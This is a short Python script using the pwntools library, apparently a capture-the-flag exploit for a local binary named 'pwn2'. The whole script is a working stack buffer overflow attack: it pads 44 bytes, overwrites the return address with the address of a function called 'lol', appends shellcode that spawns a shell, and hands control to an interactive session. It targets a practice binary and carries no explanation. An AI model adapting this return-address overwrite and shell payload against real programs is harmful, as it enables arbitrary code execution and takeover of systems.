from pwn import *
elf = ELF("./pwn2")
p = process("./pwn2")
offset = b"A"*44
target = p32(elf.symbols["lol"])
p.sendline(offset+target+asm(shellcraft.sh()))
p.interactive()
